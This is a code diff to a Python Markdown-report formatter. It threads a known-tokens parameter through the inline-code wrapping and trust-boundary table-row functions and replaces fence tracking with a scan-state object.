-            # Strip trailing punctuation (`.`, `,`, `;`, `)`, `?`, `!`).
-            trailing = ""
-            # A token whose parens are BALANCED owns its closing `)` — stripping
-            # it would push the paren outside the span and leave the call
-            # visibly unterminated (`` `foo(a, b` ) ``). Only an unmatched
-            # trailing `)` is prose punctuation.
-            _balanced_parens = tok.count("(") == tok.count(")") and "(" in tok
-            while tok.endswith((".", ",", ";", ")", "?", "!")) and not tok.endswith("()"):
-                if tok.endswith(")") and _balanced_parens:
-                    break
-                # Preserve trailing `()` on function-calls; everything else
-                # (period, comma, semicolon, closing paren in prose) goes
-                # OUTSIDE the backtick span.
-                trailing = tok[-1] + trailing
-                tok = tok[:-1]
-                e -= 1
-            if not tok:
-                continue
-            out2.append(line[last:s])
-            out2.append(f"`{tok}`" + trailing)
-            last = e + len(trailing)
-            n_changes += 1
-        out2.append(line[last:])
-        line = "".join(out2)
-        n_total += n_changes
-
-    # Second merge sweep. The pass at the top only sees spans the LLM authored;
-    # spans created by the wrapping passes above can themselves acquire a bare
-    # continuation — `__builtins__` is backticked by the `const` pass, and only
-    # then is `` `__builtins__`['__import__'] `` a split span. Running the
-    # repair once more closes that ordering gap; without it the merge landed on
-    # the NEXT invocation, so the formatter was not idempotent over a document
-    # (found 2026-07-19 by re-running it over a whole real report).
+    # A second merge sweep handles a continuation made visible by wrapping a
+    # previously bare head. This is delimiter repair, not token recognition.
     line, n_merge = _merge_split_code_spans(line)
     line, n_html = _html_cell_code_spans(line)
     return line, n_total + n_merge + n_html
+
+
+def format_inline_code(line: str, known_tokens: Iterable[str] = ()) -> tuple[str, int]:
+    """Public canonical inline-code API used by every report renderer."""
+
+    return _wrap_line(line, known_tokens)
 
 
 _AI_PADDING_SENTENCE_RE = re.compile(
@@ -1387,7 +779,7 @@ def _html_table_header_cells(line: str) -> tuple[str, ...]:
     return tuple(html.unescape(_HTML_TAG_RE.sub("", cell)).strip() for cell in _HTML_TH_RE.findall(line))
 
 
-def _format_trust_boundary_html_row(line: str) -> tuple[str, int]:
+def _format_trust_boundary_html_row(line: str, known_tokens: Iterable[str] = ()) -> tuple[str, int]:
     """`_format_trust_boundary_table_row` for the raw-HTML form of the table."""
     total = 0
     index = -1
@@ -1397,7 +789,7 @@ def _format_trust_boundary_html_row(line: str) -> tuple[str, int]:
         index += 1
         if index in _TRUST_BOUNDARY_PROSE_COLUMNS:
             return match.group(0)
-        formatted, n = _wrap_line(match.group(2))
+        formatted, n = _wrap_line(match.group(2), known_tokens)
         formatted, n_unwrap = _apply_label_as_code_unwrap(formatted)
         # `_wrap_line` sees only the cell's inner text, so its own HTML-cell
         # guard cannot fire — convert here, where the context IS known.
@@ -1408,7 +800,7 @@ def _format_trust_boundary_html_row(line: str) -> tuple[str, int]:
     return _HTML_TD_RE.sub(_cell, line), total
 
 
-def _format_trust_boundary_table_row(line: str) -> tuple[str, int]:
+def _format_trust_boundary_table_row(line: str, known_tokens: Iterable[str] = ()) -> tuple[str, int]:
     """Format non-prose cells while keeping boundary narrative typography."""
     parts = _split_unescaped_table_pipes(line)
     if len(parts) < min(len(header) for header in _TRUST_BOUNDARY_TABLE_HEADERS) + 2:
@@ -1418,19 +810,19 @@ def _format_trust_boundary_table_row(line: str) -> tuple[str, int]:
         column_index = part_index - 1
         if column_index in _TRUST_BOUNDARY_PROSE_COLUMNS:
             continue
-        formatted, n_wrap = _wrap_line(parts[part_index])
+        formatted, n_wrap = _wrap_line(parts[part_index], known_tokens)
         formatted, n_unwrap = _apply_label_as_code_unwrap(formatted)
         parts[part_index] = formatted
         total += n_wrap + n_unwrap
     return "|".join(parts), total
 
 
-def apply_fixes(text: str) -> tuple[str, int]:
+def apply_fixes(text: str, known_tokens: Iterable[str] = ()) -> tuple[str, int]:
     """Apply all prose-fix classes outside fenced blocks. Returns
     (new_text, n_fixes_total)."""
     lines = text.splitlines(keepends=True)
     out: list[str] = []
-    in_fence = False
+    scan_state = MarkdownScanState()
     in_html_block = False
     inline_fixes = 0
     padding_fixes = 0
@@ -1442,12 +834,7 @@ def apply_fixes(text: str) -> tuple[str, int]:
         nl = "\n" if raw.endswith("\n") else ""
         line = raw[:-1] if nl else raw
         stripped = line.lstrip()
-        # Track fence state.
-        if stripped.startswith("```"):
-            in_fence = not in_fence
-            out.append(raw)
-            continue
-        if in_fence:
+        if not scan_state.scannable(line):
             out.append(raw)
             continue
         # Skip headings; track HTML-blockquote blocks. Table rows used to
@@ -1478,7 +865,7 @@ def apply_fixes(text: str) -> tuple[str, int]:
             if "</blockquote>" in stripped:
                 in_html_block = False
             if _html_block_body_wrappable(stripped):
-                new_line, n_bq = _wrap_line(line)
+                new_line, n_bq = _wrap_line(line, known_tokens)
                 inline_fixes += n_bq
                 out.append(new_line + nl)
             else:
@@ -1488,12 +875,12 @@ def apply_fixes(text: str) -> tuple[str, int]:
             out.append(raw)
             continue
         if in_trust_boundary_table and is_table_row:
-            new_line, n_table = _format_trust_boundary_table_row(line)
+            new_line, n_table = _format_trust_boundary_table_row(line, known_tokens)
             inline_fixes += n_table
             out.append(new_line + nl)
             continue
         if in_trust_boundary_table and "<td" in stripped:
-            new_line, n_table = _format_trust_boundary_html_row(line)
+            new_line, n_table = _format_trust_boundary_html_row(line, known_tokens)
             inline_fixes += n_table
             out.append(new_line + nl)
             continue
@@ -1501,7 +888,7 @@ def apply_fixes(text: str) -> tuple[str, int]:
         # rhetorical / perimeter passes stay prose-only — they would
         # change the visible cell content in ways that the table reader
         # cannot easily reconcile against the YAML source.
-        new_line, n1 = _wrap_line(line)
+        new_line, n1 = _wrap_line(line, known_tokens)
         inline_fixes += n1
         # R-7 (2026-05): unwrap labels / field names / bare HTTP methods
         # that got incorrectly backticked. Runs on prose AND table rows
@@ -1542,7 +929,7 @@ def apply_fixes(text: str) -> tuple[str, int]:
     return body, total
 
 
-def apply_code_formatting(text: str) -> tuple[str, int]:
+def apply_code_formatting(text: str, known_tokens: Iterable[str] = ()) -> tuple[str, int]:
     """Formatting-only subset of ``apply_fixes`` — backtick code/path tokens
     (and normalise title path tails) WITHOUT the prose-content passes
     (AI-padding, rhetorical-severity, perimeter-claim strip).
@@ -1558,7 +945,7 @@ def apply_code_formatting(text: str) -> tuple[str, int]:
     """
     lines = text.splitlines(keepends=True)
     out: list[str] = []
-    in_fence = False
+    scan_state = MarkdownScanState()
     in_html_block = False
     in_trust_boundary_table = False
     total = 0
@@ -1566,11 +953,7 @@ def apply_code_formatting(text: str) -> tuple[str, int]:
         nl = "\n" if raw.endswith("\n") else ""
         line = raw[:-1] if nl else raw
         stripped = line.lstrip()
-        if stripped.startswith("```"):
-            in_fence = not in_fence
-            out.append(raw)
-            continue
-        if in_fence:
+        if not scan_state.scannable(line):
             out.append(raw)
             continue
         is_table_row = stripped.startswith("|")
@@ -1594,26 +977,23 @@ def apply_code_formatting(text: str) -> tuple[str, int]:
             # Same rule as apply_fixes: the wrapper is presentation, its
             # Markdown body still needs code-token backticking.
             if _html_block_body_wrappable(stripped):
-                new_line, n_bq = _wrap_line(line)
+                new_line, n_bq = _wrap_line(line, known_tokens)
                 total += n_bq
                 out.append(new_line + nl)
             else:
                 out.append(raw)
             continue
-        if stripped.startswith("#"):  # headings stay clean (no backticks)
-            out.append(raw)
-            continue
         if in_trust_boundary_table and is_table_row:
-            new_line, n_table = _format_trust_boundary_table_row(line)
+            new_line, n_table = _format_trust_boundary_table_row(line, known_tokens)
             total += n_table
             out.append(new_line + nl)
             continue
         if in_trust_boundary_table and "<td" in stripped:
-            new_line, n_table = _format_trust_boundary_html_row(line)
+            new_line, n_table = _format_trust_boundary_html_row(line, known_tokens)
             total += n_table
             out.append(new_line + nl)
             continue
-        new_line, n1 = _wrap_line(line)
+        new_line, n1 = _wrap_line(line, known_tokens)
         new_line, n5 = _apply_label_as_code_unwrap(new_line)
         total += n1 + n5
         out.append(new_line + nl)
